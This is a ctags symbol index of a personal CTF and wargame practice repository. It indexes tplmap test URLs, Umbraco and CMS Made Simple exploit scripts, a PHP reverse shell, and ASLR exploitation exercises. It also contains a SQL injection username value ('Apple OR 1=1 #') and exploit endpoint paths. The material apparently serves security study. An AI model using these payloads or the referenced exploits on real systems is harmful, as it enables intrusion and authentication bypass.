+url	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    url = 'http:\/\/127.0.0.1:15004\/ejs?inj=*&tpl=%s'$/;"	v	class:EjsTests
+url	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    url = 'http:\/\/127.0.0.1:15004\/javascript?inj=*&tpl=%s'$/;"	v	class:JavascriptTests
+url	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    url = 'http:\/\/127.0.0.1:15004\/marko?inj=*&tpl=%s'$/;"	v	class:MarkoTests
+url	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    url = 'http:\/\/127.0.0.1:15004\/nunjucks?inj=*&tpl=%s'$/;"	v	class:NunjucksTests
+url	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    url = 'http:\/\/127.0.0.1:15004\/pug?inj=*&tpl=%s'$/;"	v	class:PugTest
+url	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    url = 'http:\/\/localhost:15002\/eval.php?inj=*&tpl=%s'$/;"	v	class:PhpTests
+url	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    url = 'http:\/\/127.0.0.1:15002\/smarty-3.1.32-secured.php?inj=*&tpl=%s'$/;"	v	class:SmartySecuredTest
+url	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    url = 'http:\/\/127.0.0.1:15002\/smarty-3.1.32-unsecured.php?inj=*&tpl=%s'$/;"	v	class:SmartyUnsecuredTest
+url	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    url = 'http:\/\/127.0.0.1:15002\/twig-1.20.0-secured.php?tpl=%s&inj=*'$/;"	v	class:TwigSecuredTest
+url	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    url = 'http:\/\/127.0.0.1:15002\/twig-1.19.0-unsecured.php?tpl=%s&inj=*'$/;"	v	class:TwigUnsecuredTest
+url	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    url = 'http:\/\/127.0.0.1:15001\/reflect\/jinja2?tpl=%s&inj=*'$/;"	v	class:Jinja2Test
+url	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    url = 'http:\/\/127.0.0.1:15001\/reflect\/mako?tpl=%s&inj=*'$/;"	v	class:MakoTest
+url	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    url = 'http:\/\/localhost:15001\/reflect\/eval?inj=*&tpl=%s'$/;"	v	class:PythonTests
+url	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    url = 'http:\/\/127.0.0.1:15001\/reflect\/tornado?tpl=%s&inj=*'$/;"	v	class:TornadoTest
+url	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    url = 'http:\/\/localhost:15005\/reflect\/erb?inj=*&tpl=%s'$/;"	v	class:ErbTests
+url	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    url = 'http:\/\/localhost:15005\/reflect\/eval?inj=*&tpl=%s'$/;"	v	class:RubyTests
+url	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    url = 'http:\/\/localhost:15005\/reflect\/slim?inj=*&tpl=%s'$/;"	v	class:SlimTests
+url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^url = https:\/\/grafana.com$/;"	k	section:grafana_com
+url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^url = https:\/\/grafana.com$/;"	k	section:grafana_net
+url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^url =$/;"	k	section:database
+url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^url =$/;"	k	section:external_image_storage.webdav
+url_blind	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    url_blind = 'http:\/\/127.0.0.1:15003\/freemarker?inj=*&tpl=%s&blind=1'$/;"	v	class:FreemarkerTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    url_blind = 'http:\/\/127.0.0.1:15003\/velocity?inj=*&tpl=%s&blind=1'$/;"	v	class:VelocityTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/dot?inj=*&tpl=%s'$/;"	v	class:DotTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/dust?inj=*&tpl=%s'$/;"	v	class:DustTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/ejs?inj=*&tpl=%s'$/;"	v	class:EjsTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/javascript?inj=*&tpl=%s'$/;"	v	class:JavascriptTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/marko?inj=*&tpl=%s'$/;"	v	class:MarkoTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/nunjucks?inj=*&tpl=%s'$/;"	v	class:NunjucksTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    url_blind = 'http:\/\/127.0.0.1:15004\/blind\/pug?inj=*&tpl=%s'$/;"	v	class:PugTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    url_blind = 'http:\/\/localhost:15002\/eval.php?inj=*&tpl=%s&blind=1'$/;"	v	class:PhpTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    url_blind = 'http:\/\/127.0.0.1:15002\/smarty-3.1.32-secured.php?inj=*&tpl=%s&blind=1'$/;"	v	class:SmartySecuredTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    url_blind = 'http:\/\/127.0.0.1:15002\/smarty-3.1.32-unsecured.php?inj=*&tpl=%s&blind=1'$/;"	v	class:SmartyUnsecuredTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    url_blind = ''$/;"	v	class:TwigSecuredTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    url_blind = 'http:\/\/127.0.0.1:15002\/twig-1.19.0-unsecured.php?tpl=%s&inj=*&blind=1'$/;"	v	class:TwigUnsecuredTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    url_blind = 'http:\/\/127.0.0.1:15001\/blind\/jinja2?tpl=%s&inj=*'$/;"	v	class:Jinja2Test
+url_blind	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    url_blind = 'http:\/\/127.0.0.1:15001\/blind\/mako?tpl=%s&inj=*'$/;"	v	class:MakoTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    url_blind = 'http:\/\/localhost:15001\/blind\/eval?inj=*&tpl=%s'$/;"	v	class:PythonTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    url_blind = 'http:\/\/127.0.0.1:15001\/blind\/tornado?tpl=%s&inj=*'$/;"	v	class:TornadoTest
+url_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    url_blind = 'http:\/\/localhost:15005\/blind\/erb?inj=*&tpl=%s'$/;"	v	class:ErbTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    url_blind = 'http:\/\/localhost:15005\/blind\/eval?inj=*&tpl=%s'$/;"	v	class:RubyTests
+url_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    url_blind = 'http:\/\/localhost:15005\/blind\/slim?inj=*&tpl=%s'$/;"	v	class:SlimTests
+url_login	htb/Remote/Gaining/umbraco_cve1.py	/^url_login = host+"\/umbraco\/backoffice\/UmbracoApi\/Authentication\/PostLogin";$/;"	v
+url_login	htb/Remote/Gaining/umbraco_cve2.py	/^url_login = host+"\/umbraco\/backoffice\/UmbracoApi\/Authentication\/PostLogin";$/;"	v
+url_login	htb/Remote/Gaining/umbraco_cve3.py	/^url_login = host+"\/umbraco\/backoffice\/UmbracoApi\/Authentication\/PostLogin";$/;"	v
+url_main	htb/Remote/Gaining/umbraco_cve1.py	/^url_main =host+"\/umbraco\/";$/;"	v
+url_main	htb/Remote/Gaining/umbraco_cve2.py	/^url_main =host+"\/umbraco\/";$/;"	v
+url_main	htb/Remote/Gaining/umbraco_cve3.py	/^url_main =host+"\/umbraco\/";$/;"	v
+url_reflect	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def url_reflect(engine, injection):$/;"	f
+url_vuln	thm/Simple_CTF/46635.py	/^url_vuln = options.url + '\/moduleinterface.php?mact=News,m1_,default,0'$/;"	v
+url_vuln	thm/Simple_CTF/46635.py.bak	/^url_vuln = options.url + '\/moduleinterface.php?mact=News,m1_,default,0'$/;"	v
+url_xslt	htb/Remote/Gaining/umbraco_cve1.py	/^url_xslt = host+"\/umbraco\/developer\/Xslt\/xsltVisualize.aspx";$/;"	v
+url_xslt	htb/Remote/Gaining/umbraco_cve2.py	/^url_xslt = host+"\/umbraco\/developer\/Xslt\/xsltVisualize.aspx";$/;"	v
+url_xslt	htb/Remote/Gaining/umbraco_cve3.py	/^url_xslt = host+"\/umbraco\/developer\/Xslt\/xsltVisualize.aspx";$/;"	v
+usage	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^usage = "python %prog [options]"$/;"	v
+user	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^user = root$/;"	k	section:database
+user	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^user =$/;"	k	section:smtp
+userLevel	dreamhackctf/login-1/app.py	/^userLevel = {$/;"	v
+user_org	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^user_org = 10$/;"	k	section:quota
+username	dreamhackctf/login-1/request_.py	/^username = "Apple OR 1=1 #"$/;"	v
+username	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^username =$/;"	k	section:external_image_storage.webdav
+users	dreamhackctf/cookie/app.py	/^users = {$/;"	v
+users	dreamhackctf/login-1/app.py	/^def users(useridx):$/;"	f
+users	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[users]$/;"	s
+uucp	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^uucp:x:10:10:uucp:\/var\/spool\/uucp:\/bin\/sh$/;"	u	home:/var/spool/uucp	shell:/bin/sh
+value	thm/Advent_of_Cyber/Day9/Day9RequestScript.py	/^value = {'value':'C','next':'s'}$/;"	v
+var	dreamhackctf/login-1/tplmap/utils/closures.py	/^var = [ 'a' ]$/;"	v
+velocity	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/src/main/java/org/tplmap/webframeworks/SparkApplication.java	/^public static Object velocity(Request request, Response response) {$/;"	m	class:SparkApplication
+verify_email_enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^verify_email_enabled = false$/;"	k	section:users
+version	dreamhackctf/login-1/tplmap/tplmap.py	/^version = '0.5'$/;"	v
+versions_to_keep	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^versions_to_keep = 20$/;"	k	section:dashboards
+viewers_can_edit	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^viewers_can_edit = false$/;"	k	section:users
+welcome_email_on_sign_up	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^welcome_email_on_sign_up = false$/;"	k	section:emails
+whitelist	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^whitelist =$/;"	k	section:auth.proxy
+wordlist	thm/Simple_CTF/46635.py	/^wordlist = ""$/;"	v
+wordlist	thm/Simple_CTF/46635.py.bak	/^wordlist = ""$/;"	v
+write	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def write(self, data, remote_path):$/;"	m	class:Plugin
+write_a	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$write_a = null;$/;"	v
+write_got	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^write_got = 0x804a01c$/;"	v
+write_got	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^write_got = 0x804a01c$/;"	v
+write_plt	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^write_plt = 0x8048370$/;"	v
+write_plt	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^write_plt = 0x8048370$/;"	v
+www-data	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^www-data:x:33:33:www-data:\/var\/www:\/bin\/sh$/;"	u	home:/var/www	shell:/bin/sh
+x_content_type_options	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^x_content_type_options = false$/;"	k	section:security
+x_xss_protection	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^x_xss_protection = false$/;"	k	section:security
+zipStoreBase	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/gradle/wrapper/gradle-wrapper.properties	/^zipStoreBase=GRADLE_USER_HOME$/;"	k
+zipStorePath	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/gradle/wrapper/gradle-wrapper.properties	/^zipStorePath=wrapper\/dists$/;"	k
+zipkin_propagation	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^zipkin_propagation = false$/;"	k	section:tracing.jaeger
